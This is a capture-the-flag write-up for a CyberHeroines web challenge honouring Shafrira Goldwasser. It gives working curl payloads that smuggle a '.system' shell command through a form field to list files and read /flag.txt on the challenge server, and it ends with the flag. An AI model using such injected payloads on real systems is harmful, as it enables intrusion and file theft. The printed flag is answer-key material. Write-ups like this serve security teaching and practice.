# Shafrira Goldwasser

## Description
> Shafrira Goldwasser (Hebrew: שפרירה גולדווסר; born 1959) is an Israeli-American computer scientist and winner of the Turing Award in 2012. She is the RSA Professor of Electrical Engineering and Computer Science at Massachusetts Institute of Technology; a professor of mathematical sciences at the Weizmann Institute of Science, Israel; the director of the Simons Institute for the Theory of Computing at the University of California, Berkeley; and co-founder and chief scientist of Duality Technologies.

> Chal: I asked ChatGPT to make this webapp but I couldnt prove it was secure. In honor of this Turing Award winner, prove it is insecure by returning the flag.

### Challenge Link

[URL](https://cyberheroines-web-srv4.chals.io/)

## Attachments
[webapp.zip](./webapp.zip)

## Solution
* The website let’s us choose a Cyber Heroine and read their biography. The most probable attack vector seems SQLi.
* It is also vulnerable to command injection. We can use the following payload to list the files in the directory:
```
curl -X POST -d "heroine_name='\" -cmd \".system 'ls" http://ec2-3-144-228-78.us-east-2.compute.amazonaws.com:6264/
```

* The flag is in the root directory of the server
* To read the `flag.txt` contents we can use the follwing `CURL` command
```
curl -X POST -d "heroine_name='\" -cmd \".system ls -la;cat /flag.txt'" http://ec2-3-144-228-78.us-east-2.compute.amazonaws.com:6264/
```

### FLAG
```
chctf{CH4ng3d_h0w_w3_th1Nk_of_pr00f$}
```